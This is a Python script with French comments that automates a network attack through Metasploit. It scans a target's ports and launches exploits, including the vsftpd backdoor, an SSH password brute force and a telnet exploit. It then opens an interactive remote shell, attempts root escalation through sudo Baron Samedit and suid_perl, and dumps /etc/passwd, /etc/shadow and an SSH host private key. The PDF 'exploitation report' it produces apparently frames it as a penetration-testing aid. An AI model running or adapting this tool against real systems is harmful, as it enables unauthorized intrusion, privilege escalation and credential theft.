import subprocess
import nmap
from pymetasploit3.msfrpc import MsfRpcClient
import os
import sys
import time
import getpass
import ipaddress
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib.styles import getSampleStyleSheet
from reportlab.lib.pagesizes import letter
from reportlab.lib import colors
from reportlab.lib.units import inch

# Dictionnaire pour stocker les informations d'exploitation
exploitation_info = {
    "target": "",
    "open_ports": {},
    "exploit_details": {},
    "collected_data": [],
    "privilege_escalation": {
        "success": False,
        "details": "",
        "recommendations": ""
    }
}

# Vérifie si Metasploit est installé
def check_metasploit():
    if not os.path.exists("C:\\metasploit-framework\\bin\\msfconsole.bat"):
        print("Metasploit n'est pas installé. Veuillez l'installer et réessayer.")
        sys.exit(1)

# Vérifie si une adresse IP est valide
def is_valid_ip(address):
    try:
        ipaddress.ip_address(address)
        return True
    except ValueError:
        print("Adresse IP non valide.")
        return False

# Scanne les ports ouverts sur la cible
def scan_ports(target):
    nm = nmap.PortScanner()
    nm.scan(target, '1-1024')
    return {port: nm[target]['tcp'][port]['name'] for port in nm[target]['tcp'].keys() if nm[target]['tcp'][port]['state'] == 'open'}

# Détermine le module d'exploitation en fonction du service
def determine_exploit_module(service):
    service_to_module = {
        'ftp': 'exploit/unix/ftp/vsftpd_234_backdoor',
        'ssh': 'auxiliary/scanner/ssh/ssh_login',
        'telnet': 'exploit/unix/telnet/telnet_encrypt_keyid',
    }
    return service_to_module.get(service.lower())

# Utilise Metasploit pour exploiter la cible
def exploit_with_metasploit(target, port, service):
    password = getpass.getpass("Entrez le mot de passe pour Metasploit RPC: ")
    client = MsfRpcClient(password, server='127.0.0.1', port=55552)
    exploit_module = determine_exploit_module(service)
    if not exploit_module:
        print("Aucun exploit connu pour ce service.")
        return None, None

    if service == 'ssh':
        username = input("Entrez le nom d'utilisateur pour l'attaque SSH : ")
        password_file = input("Entrez le chemin vers le fichier de mots de passe : ")
        exploit = client.modules.use('auxiliary', exploit_module)
        exploit['RHOSTS'] = target
        exploit['RPORT'] = port
        exploit['USERNAME'] = username
        exploit['PASS_FILE'] = password_file
        exploit['STOP_ON_SUCCESS'] = True
        exploitation_info['exploit_details'] = {
            'Module': exploit_module,
            'RHOSTS': target,
            'RPORT': port,
            'USERNAME': username,
            'PASS_FILE': password_file
        }
    else:
        exploit = client.modules.use('exploit', exploit_module)
        exploit['RHOSTS'] = target
        exploit['RPORT'] = port
        exploitation_info['exploit_details'] = {
            'Module': exploit_module,
            'RHOSTS': target,
            'RPORT': port
        }

    result = exploit.execute(payload='cmd/unix/interact')
    print(f"Exploitation lancée contre {target}:{port} avec le module {exploit_module}, résultat: {result}")

    sessions = client.sessions.list
    if sessions:
        session_id = list(sessions.keys())[0]
        return client, session_id
    print("Aucune session active n'a été ouverte.")
    return None, None

# Démarre une session interactive sur la cible
def interactive_shell(client, session_id):
    print("Démarrage d'une session interactive...")
    shell = client.sessions.session(session_id)
    print("Vous êtes maintenant connecté au shell de la machine cible. Tapez 'exit' pour quitter.")
    while True:
        command = input("$ ")
        if command.lower() == 'exit':
            break
        shell.write(command + '\n')
        time.sleep(1)  # Temps pour exécuter la commande
        print(shell.read())

# Menu de post-exploitation pour choisir les actions à réaliser
def post_exploitation(client, session_id):
    while True:
        print("\nOptions de post-exploitation:")
        print("1. Collecte de données")
        print("2. Escalade de privilèges")
        print("3. Session interactive avec le shell")
        print("4. Générer rapport PDF et quitter")
        print("5. Quitter")
        choice = input("Choisissez une option : ")

        if choice == '1':
            collect_data(client, session_id)
        elif choice == '2':
            escalate_privileges(client, session_id)
        elif choice == '3':
            interactive_shell(client, session_id)
        elif choice == '4':
            generate_pdf_report()
            break    
        elif choice == '5':
            break
        else:
            print("Choix non valide.")

# Tente d'escalader les privilèges sur la machine cible
def escalate_privileges(client, session_id):
    print("Tentative d'escalade de privilèges...")
    shell = client.sessions.session(session_id)
    
    # Modules d'escalade de privilèges
    escalate_modules = [
        'exploit/linux/local/sudo_baron_samedit',  # CVE-2021-3156
        'exploit/linux/local/suid_perl',
        'post/multi/recon/local_exploit_suggester' 
    ]
    
    original_sessions = client.sessions.list
    for module in escalate_modules:
        try:
            if module.startswith('exploit'):
                exploit = client.modules.use('exploit', module)
            else:
                exploit = client.modules.use('post', module)
                
            exploit['SESSION'] = int(session_id)
            result = exploit.execute()
            print(f"Tentative d'escalade de privilèges avec {module}, résultat: {result}")

            if isinstance(result, dict) and 'job_id' in result and result['job_id'] is not None:
                job_id = result['job_id']
                print(f"Job démarré avec ID: {job_id}")

                # Attendre que le job se termine
                while True:
                    job = client.jobs.list.get(job_id)
                    if not job:
                        break
                    time.sleep(1)

                # Vérifier si une nouvelle session est créée après l'escalade
                new_sessions = client.sessions.list
                if len(new_sessions) > len(original_sessions):
                    new_session_id = list(new_sessions.keys())[-1]  # Supposons que la nouvelle session soit la dernière
                    print("Escalade de privilèges réussie ! Nouvelle session créée.")
                    exploitation_info['privilege_escalation']['success'] = True
                    exploitation_info['privilege_escalation']['details'] = f"Escalade de privilèges réussie avec le module {module}"
                    
                    # Vérification des privilèges
                    shell = client.sessions.session(new_session_id)
                    shell.write('whoami\n')
                    time.sleep(1)
                    whoami_output = shell.read()
                    print(f"Utilisateur après escalade: {whoami_output.strip()}")

                    interactive_shell(client, new_session_id)
                    return
            else:
                print(f"Le module {module} n'a pas démarré de job ou a échoué.")
        except Exception as e:
            print(f"Echec de l'escalade de privilèges avec {module}: {e}")

    exploitation_info['privilege_escalation']['success'] = False
    exploitation_info['privilege_escalation']['details'] = "Escalade de privilèges échouée."
    exploitation_info['privilege_escalation']['recommendations'] = "Assurez-vous que les systèmes sont mis à jour avec les derniers correctifs de sécurité et utilisez les configurations recommandées pour réduire les risques de vulnérabilités locales."

# Collecte des données sensibles sur la machine cible
def collect_data(client, session_id):
    print("Collecte des données...")
    shell = client.sessions.session(session_id)
    print("Collecte des données sensibles...")
    sensitive_files = ['/etc/passwd', '/etc/shadow', '/etc/ssh/ssh_host_dsa_key']
    collected_data = []
    for file_path in sensitive_files:
        print(f"Contenu de : {file_path}:")
        shell.write(f"cat {file_path}\n")
        time.sleep(2)  # Laissez du temps pour que la commande se termine
        content = shell.read()
        print(content)
        collected_data.append(f"Contenu de : {file_path}:\n{content}")
    exploitation_info['collected_data'] = collected_data

# Génère un rapport PDF des activités d'exploitation
def generate_pdf_report():
    # Obtenir le chemin du répertoire du script
    script_dir = os.path.dirname(os.path.abspath(__file__))
    report_dir = os.path.join(script_dir, 'reports')

    # Créer le répertoire 'reports' s'il n'existe pas
    if not os.path.exists(report_dir):
        os.makedirs(report_dir)

    # Chemin complet du fichier PDF
    filename = os.path.join(report_dir, "exploitation_report.pdf")

    document = SimpleDocTemplate(filename, pagesize=letter)
    styles = getSampleStyleSheet()
    Story = []

    Story.append(Paragraph('Rapport d\'exploitation', styles['Title']))
    Story.append(Spacer(1, 12))

    # Traitement de l'adresse IP cible
    if exploitation_info['target']:
        Story.append(Paragraph(f"Target IP: {exploitation_info['target']}", styles['BodyText']))
        Story.append(Spacer(1, 12))

    # Traitement des ports ouverts
    if exploitation_info['open_ports']:
        Story.append(Paragraph("Ports ouverts et services détectés:", styles['Heading2']))
        for port, service in exploitation_info['open_ports'].items():
            Story.append(Paragraph(f"Port {port}: {service}", styles['BodyText']))
        Story.append(Spacer(1, 12))

    # Détails de l'exploit utilisé
    if exploitation_info['exploit_details']:
        Story.append(Paragraph("Détails de l'exploit utilisé:", styles['Heading2']))
        for key, value in exploitation_info['exploit_details'].items():
            Story.append(Paragraph(f"{key}: {value}", styles['BodyText']))
        Story.append(Spacer(1, 12))

    # Détails de l'escalade de privilèges
    Story.append(Paragraph("Escalade de privilèges:", styles['Heading2']))
    if exploitation_info['privilege_escalation']['success']:
        Story.append(Paragraph("Escalade de privilèges réussie.", styles['BodyText']))
    else:
        Story.append(Paragraph("Escalade de privilèges échouée.", styles['BodyText']))
    Story.append(Paragraph(exploitation_info['privilege_escalation']['details'], styles['BodyText']))
    Story.append(Spacer(1, 12))

    # Recommandations
    if exploitation_info['privilege_escalation']['recommendations']:
        Story.append(Paragraph("Recommandations:", styles['Heading2']))
        Story.append(Paragraph(exploitation_info['privilege_escalation']['recommendations'], styles['BodyText']))
        Story.append(Spacer(1, 12))

    # Données collectées pendant la post-exploitation
    if exploitation_info['collected_data']:
        Story.append(Paragraph("Données sensibles collectées:", styles['Heading2']))
        for data in exploitation_info['collected_data']:
            Story.append(Paragraph(data, styles['BodyText']))
        Story.append(Spacer(1, 12))

    document.build(Story)
    print(f"Le rapport PDF a été généré: {filename}")

# Menu principal pour l'exécution de l'exploitation
def exploitation_menu():
    check_metasploit()
    target = input("Entrez l'adresse IP ou le nom de domaine à scanner : ")
    if not is_valid_ip(target):
        return
    exploitation_info['target'] = target  # Mise à jour des informations de la cible
    open_ports = scan_ports(target)
    exploitation_info['open_ports'] = open_ports  # Mise à jour des ports ouverts
    print("Ports ouverts et services détectés :")
    for port, service in open_ports.items():
        print(f"Port {port}: {service}")

    port_to_exploit = input("Entrez le numéro du port à exploiter (ou 'quit' pour quitter) : ")
    if port_to_exploit.lower() == 'quit':
        return
    client, session_id = exploit_with_metasploit(target, int(port_to_exploit), open_ports[int(port_to_exploit)])
    if client and session_id:
        post_exploitation(client, session_id)
    
if __name__ == "__main__":
    exploitation_menu()
